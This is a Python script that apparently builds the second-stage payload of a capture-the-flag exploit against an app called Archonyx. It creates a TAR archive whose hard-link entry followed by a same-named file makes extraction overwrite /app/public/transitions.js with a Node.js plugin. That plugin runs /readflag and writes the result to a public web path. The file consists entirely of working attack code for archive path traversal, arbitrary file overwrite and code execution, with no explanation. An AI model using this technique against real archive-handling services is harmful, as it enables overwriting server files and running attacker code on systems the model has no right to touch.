#!/usr/bin/env python3

from __future__ import annotations

import argparse
import io
import tarfile
from pathlib import Path


PLUGIN_SOURCE = """\
const fs = require('fs');
const { execFileSync } = require('child_process');

fs.writeFileSync(
  '/app/public/archonyx-proof.txt',
  execFileSync('/readflag')
);

const plugin = {
  install: function () {}
};

if (typeof registerPlugin === 'function') {
  registerPlugin(plugin);
} else {
  module.exports = plugin;
}
"""


def build_archive(output: Path) -> None:
    data = PLUGIN_SOURCE.encode("utf-8")

    with tarfile.open(output, "w") as archive:
        link = tarfile.TarInfo("pivot")
        link.type = tarfile.LNKTYPE
        link.linkname = "/app/public/transitions.js"
        link.mode = 0o644
        archive.addfile(link)

        entry = tarfile.TarInfo("pivot")
        entry.size = len(data)
        entry.mode = 0o644
        archive.addfile(entry, io.BytesIO(data))


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "Build the Archonyx Stage 2 TAR payload that overwrites "
            "/app/public/transitions.js with a LESS plugin."
        )
    )
    parser.add_argument(
        "--output",
        type=Path,
        default=Path("stage2.tar"),
        help="Output TAR path. Default: stage2.tar",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    build_archive(args.output)
    print(f"Created {args.output}")


if __name__ == "__main__":
    main()
